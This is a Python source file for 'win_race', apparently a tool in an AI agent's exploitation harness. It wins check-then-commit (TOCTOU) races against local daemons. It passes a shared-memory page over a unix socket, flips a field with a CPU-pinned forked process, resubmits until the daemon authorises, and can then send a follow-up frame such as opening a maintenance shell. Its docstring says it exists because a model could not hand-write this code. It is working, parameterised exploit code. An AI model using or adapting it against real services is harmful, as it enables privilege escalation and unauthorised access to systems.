"""win_race — the baked concurrency driver for a check-then-commit / double-fetch (TOCTOU)
race. The counterpart to re_emulate: re_emulate CONFIRMS the gate is a race and names the
field and the two values; the model reverses the wire protocol (socket path, the frame to
send, whether the daemon maps a page you hand it). This tool does the HARD CONCURRENCY the
model kept failing to hand-write (a regression run wrote zero memfd/MAP_SHARED code):

  1. put the request page in SHARED memory (memfd_create + mmap MAP_SHARED; a tmpfile fd
     where memfd_create is unavailable),
  2. pass that fd to the daemon over the unix socket via SCM_RIGHTS,
  3. run a background writer that FLIPS the field between the two values (a forked,
     CPU-pinned process on Linux; a thread elsewhere),
  4. resubmit until the daemon authorises (its reply contains the success marker),
  5. optionally fire a follow-up frame (e.g. "open maintenance shell") once authorised.

Everything is PARAMETERISED — the socket, frame, field offset, the two values, and the
success marker all come from argv. No box constants are baked; the model supplies what it
reversed. Emulation is single-threaded over static memory and can never WIN a race — this
is the tool that does.

    python3 -m harness.win_race --sock <daemon.sock> --submit-hex <frame> \
        --field-offset <off> --preview <VALUE_1> --commit <VALUE_2> --success <STATUS> \
        [--page-hex <page> | --page-size 4096] [--after-hex <frame>] [--attempts 5000]
    python3 -m harness.win_race --selftest      # prove the mechanics against a local daemon
"""
from __future__ import annotations

import argparse
import array
import os
import socket
import struct
import sys
import threading
import time


def _int(s):
    """Parse a C-ish integer: 0x.. hex, 0o.. octal, else decimal."""
    if isinstance(s, int):
        return s
    return int(s, 0)


def patch_field(buf: bytearray, offset: int, value: int, size: int, endian: str) -> None:
    """Write `value` as `size` bytes at `offset` in `buf`, in place. The one primitive the
    flipper and the page builder share, so endianness is defined in exactly one place."""
    buf[offset:offset + size] = int(value).to_bytes(size, "little" if endian == "little" else "big")


def build_page(page_hex, page_size: int, field_offset: int, field_value: int,
               field_size: int, endian: str) -> bytes:
    """The request page the daemon maps: the reversed page content (or zeros), zero-padded to
    at least page_size and to fit the field, with the mode field set to its starting value."""
    content = bytes.fromhex(page_hex) if page_hex else b""
    size = max(int(page_size), len(content), int(field_offset) + int(field_size))
    buf = bytearray(size)
    buf[:len(content)] = content
    patch_field(buf, field_offset, field_value, field_size, endian)
    return bytes(buf)


def _open_shared(size: int, use_memfd: bool = True) -> tuple[int, "any"]:
    """(fd, mmap) for a `size`-byte MAP_SHARED region a peer can map from the passed fd.
    Prefers memfd_create (Linux); falls back to an unlinked tmpfile fd where it is absent."""
    import mmap as _mmap
    memfd_create = getattr(os, "memfd_create", None)
    if use_memfd and memfd_create is not None:
        fd = memfd_create("win_race", 0)
    else:
        import tempfile
        fd, path = tempfile.mkstemp(prefix="win_race.")
        os.unlink(path)   # the fd (and the fd we pass via SCM_RIGHTS) keeps it alive
    os.ftruncate(fd, size)
    mm = _mmap.mmap(fd, size, _mmap.MAP_SHARED, _mmap.PROT_READ | _mmap.PROT_WRITE)
    return fd, mm


def _send_with_fd(sock: socket.socket, frame: bytes, fd: int) -> None:
    """Send `frame` on `sock` with `fd` attached as SCM_RIGHTS ancillary data — how the daemon
    receives the shared page to map."""
    sock.sendmsg([frame], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [fd]).tobytes())])


def _recv_with_fd(sock: socket.socket, bufsize: int = 4096) -> tuple[bytes, int | None]:
    """(data, fd) received on `sock`; fd is None if no SCM_RIGHTS ancillary arrived. The daemon
    side of _send_with_fd — used by the selftest's stand-in daemon."""
    fds = array.array("i")
    msg, ancdata, _flags, _addr = sock.recvmsg(bufsize, socket.CMSG_LEN(fds.itemsize))
    for level, typ, data in ancdata:
        if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
            fds.frombytes(data[: len(data) - (len(data) % fds.itemsize)])
    return msg, (fds[0] if len(fds) else None)


def _flip_loop(mm, offset: int, size: int, values, stop, pin=None) -> None:
    """Cycle the field through `values` (PREVIEW plus one or more candidate COMMITs) as fast as
    possible until `stop` is set. The daemon reads the field, spins its measurement window, then
    re-reads: continuous cycling + resubmitting lands the PREVIEW-then-COMMIT transition it
    demands. Sweeping several candidates lets the model win WITHOUT perfectly reversing the
    second value — it hands over the handful it reversed and one of them lands on the re-read."""
    if pin is not None and hasattr(os, "sched_setaffinity"):
        try:
            os.sched_setaffinity(0, {int(pin)})   # best-effort; unsupported -> ignored
        except OSError:
            pass
    is_set = stop.is_set if hasattr(stop, "is_set") else stop
    while not is_set():
        for v in values:
            mm[offset:offset + size] = v


def _start_flipper(kind: str, mm, offset, size, values, pin=None):
    """Start the background field-flipper and return a stop() callable. 'process' forks a
    (CPU-pinned) writer that shares the MAP_SHARED region — true parallelism, no GIL — and is
    the strong choice for a real race; 'thread' is the portable fallback (it flips whenever the
    main thread blocks on socket I/O). Falls back to a thread if fork is unavailable/fails."""
    if kind == "process" and hasattr(os, "fork"):
        try:
            pid = os.fork()
        except OSError:
            pid = -1
        if pid == 0:   # child: flip forever until killed
            try:
                _flip_loop(mm, offset, size, values, lambda: False, pin=pin)
            finally:
                os._exit(0)
        if pid > 0:
            def _stop_proc():
                try:
                    os.kill(pid, 9)
                    os.waitpid(pid, 0)
                except OSError:
                    pass
            return _stop_proc
    ev = threading.Event()
    th = threading.Thread(target=_flip_loop, args=(mm, offset, size, values, ev), kwargs={"pin": pin},
                          daemon=True)
    th.start()

    def _stop_thread():
        ev.set()
        th.join(timeout=1.0)
    return _stop_thread


def run_race(sock_path: str, submit_frame: bytes, field_offset: int, preview: int, commit,
             success: bytes, *, page: bytes, field_size: int = 4, endian: str = "little",
             after_frame: bytes = b"", attempts: int = 5000, per_attempt_timeout: float = 2.0,
             deadline_s: float = 30.0, use_memfd: bool = True, flipper: str = "process",
             pin=None, now=time.monotonic) -> dict:
    """Drive the race: shared page + fd via SCM_RIGHTS + a background flipper + resubmit until
    the reply contains `success`. `commit` may be a single value or a list of candidates the
    flipper sweeps (so an unsure second value need not be perfectly reversed). Returns
    {won, attempts, reply, after_reply}."""
    order = "little" if endian == "little" else "big"
    commits = commit if isinstance(commit, (list, tuple)) else [commit]
    a = int(preview).to_bytes(field_size, order)
    values = [a] + [int(c).to_bytes(field_size, order) for c in commits]   # cycle PREVIEW + candidates
    fd, mm = _open_shared(len(page), use_memfd=use_memfd)
    mm[:len(page)] = page
    mm[field_offset:field_offset + field_size] = a     # start at PREVIEW
    stop = _start_flipper(flipper, mm, field_offset, field_size, values, pin=pin)
    result = {"won": False, "attempts": 0, "reply": b"", "after_reply": b""}
    started = now()
    try:
        for i in range(1, int(attempts) + 1):
            if now() - started > deadline_s:
                break
            result["attempts"] = i
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.settimeout(per_attempt_timeout)
                s.connect(sock_path)
                _send_with_fd(s, submit_frame, fd)
                reply = s.recv(4096)
                s.close()
            except OSError:
                continue
            if success and success in reply:
                result["won"] = True
                result["reply"] = reply
                if after_frame:
                    try:
                        s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                        s2.settimeout(per_attempt_timeout)
                        s2.connect(sock_path)
                        s2.sendall(after_frame)
                        result["after_reply"] = s2.recv(4096)
                        s2.close()
                    except OSError:
                        pass
                break
    finally:
        stop()
        try:
            mm.close()
            os.close(fd)
        except OSError:
            pass
    return result


def selftest(window_s: float = 0.002, attempts: int = 400, commits=None, accept_commit=None) -> bool:
    """Beat a self-hosted check-then-commit daemon, proving the mechanics end to end: shared
    page (tmpfile fd, so it runs off-Linux too) + fd passed via SCM_RIGHTS + a background
    flipper + resubmit. The daemon reads the field, spins a window, re-reads, and accepts only
    when it flipped PREVIEW -> the value it wants — a static buffer can never satisfy it.
    Pass `commits` (candidates the driver sweeps) + `accept_commit` (the one the daemon wants)
    to prove the sweep wins without perfectly reversing the second value."""
    import tempfile
    field_offset, field_size, endian = 8, 4, "little"
    preview = 0x11111111
    commits = list(commits) if commits else [0x22222222]
    accept = accept_commit if accept_commit is not None else commits[0]
    a = preview.to_bytes(field_size, endian)
    b = int(accept).to_bytes(field_size, endian)   # the value the daemon accepts on the re-read
    sock_path = tempfile.mktemp(prefix="win_race_self.", suffix=".sock")
    stop = threading.Event()

    def _daemon():
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(sock_path)
        srv.listen(8)
        srv.settimeout(0.25)
        import mmap as _mmap
        while not stop.is_set():
            try:
                conn, _ = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                _msg, rfd = _recv_with_fd(conn)
                if rfd is None:
                    conn.close()
                    continue
                dm = _mmap.mmap(rfd, field_offset + field_size, _mmap.MAP_SHARED,
                                _mmap.PROT_READ | _mmap.PROT_WRITE)
                r1 = dm[field_offset:field_offset + field_size]      # first read
                time.sleep(window_s)                                 # measurement window
                r2 = dm[field_offset:field_offset + field_size]      # re-read
                dm.close()
                os.close(rfd)
                conn.sendall(b"OK" if (r1 == a and r2 == b) else b"NO")
            except OSError:
                pass
            finally:
                conn.close()
        srv.close()

    th = threading.Thread(target=_daemon, daemon=True)
    th.start()
    time.sleep(0.05)   # let the daemon bind/listen
    try:
        page = build_page(None, field_offset + field_size, field_offset, preview, field_size, endian)
        # A forked (truly parallel) flipper, matching the real case: the daemon is a separate
        # process, so a thread flipper (GIL-coupled to an in-process reader) would not model it.
        res = run_race(sock_path, b"SUBMIT", field_offset, preview, commits, b"OK",
                       page=page, field_size=field_size, endian=endian, attempts=attempts,
                       per_attempt_timeout=1.0, deadline_s=15.0, use_memfd=False, flipper="process")
        return bool(res["won"])
    finally:
        stop.set()
        th.join(timeout=2.0)
        try:
            os.unlink(sock_path)
        except OSError:
            pass


def main(argv=None) -> int:
    p = argparse.ArgumentParser(
        prog="python3 -m harness.win_race",
        description="Win a check-then-commit / double-fetch (TOCTOU) race: shared page + fd via "
                    "SCM_RIGHTS + a background field-flipper + resubmit. See the "
                    "race-condition-toctou skill. All values come from you (nothing baked).")
    p.add_argument("--sock", help="unix socket path of the target daemon")
    p.add_argument("--submit-hex", help="hex of the frame to send on the socket (fd attached)")
    p.add_argument("--field-offset", type=_int, help="offset of the mode field within the page")
    p.add_argument("--field-size", type=_int, default=4, help="field width in bytes (default 4)")
    p.add_argument("--preview", type=_int, help="value at the daemon's FIRST read (e.g. PREVIEW)")
    p.add_argument("--commit", help="value the RE-READ must see to authorise (COMMIT); "
                   "comma-separate SEVERAL candidates to sweep if unsure of the exact one, "
                   "e.g. --commit 0x...,0x...")
    p.add_argument("--success", type=_int, help="status value in the reply that means authorised")
    p.add_argument("--success-hex", default=None, help="raw bytes to match in the reply instead")
    p.add_argument("--page-hex", default=None, help="hex of the request page (default: zero page)")
    p.add_argument("--page-size", type=_int, default=4096, help="page size to map (default 4096)")
    p.add_argument("--after-hex", default=None,
                   help="hex of a follow-up frame to send once authorised (e.g. open-maint)")
    p.add_argument("--endian", default="little", choices=("little", "big"))
    p.add_argument("--attempts", type=_int, default=5000, help="max resubmits (default 5000)")
    p.add_argument("--deadline", type=float, default=30.0, help="give up after this many seconds")
    p.add_argument("--flipper", default="process", choices=("process", "thread"),
                   help="background writer: forked+pinnable process (default) or a thread")
    p.add_argument("--pin", type=_int, default=None, help="CPU to pin the flipper to (best-effort)")
    p.add_argument("--selftest", action="store_true",
                   help="prove the mechanics against a self-hosted TOCTOU daemon")
    args = p.parse_args(argv)

    if args.selftest:
        ok = selftest()
        print("win_race selftest:", "OK" if ok else "FAILED")
        return 0 if ok else 1

    required = (args.sock, args.submit_hex, args.field_offset, args.preview, args.commit)
    if any(v is None for v in required) or (args.success is None and args.success_hex is None):
        p.error("--sock, --submit-hex, --field-offset, --preview, --commit and "
                "--success/--success-hex are required (or use --selftest)")

    success = (bytes.fromhex(args.success_hex) if args.success_hex is not None
               else int(args.success).to_bytes(args.field_size, args.endian))
    commits = [_int(x) for x in str(args.commit).split(",") if x.strip()]
    page = build_page(args.page_hex, args.page_size, args.field_offset, args.preview,
                      args.field_size, args.endian)
    after = bytes.fromhex(args.after_hex) if args.after_hex else b""
    res = run_race(
        args.sock, bytes.fromhex(args.submit_hex), args.field_offset, args.preview, commits,
        success, page=page, field_size=args.field_size, endian=args.endian, after_frame=after,
        attempts=args.attempts, deadline_s=args.deadline, flipper=args.flipper, pin=args.pin)
    if res["won"]:
        print(f"win_race: AUTHORISED after {res['attempts']} attempt(s)")
        print(f"  reply: {res['reply'].hex()}")
        if after:
            print(f"  follow-up reply: {res['after_reply'].hex()}")
        return 0
    print(f"win_race: NOT authorised after {res['attempts']} attempt(s) — check --field-offset/"
          "--preview/--commit against the emulator verdict, and that the daemon maps the fd you "
          "pass (some read the page from the frame instead). Raise --attempts/--deadline.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
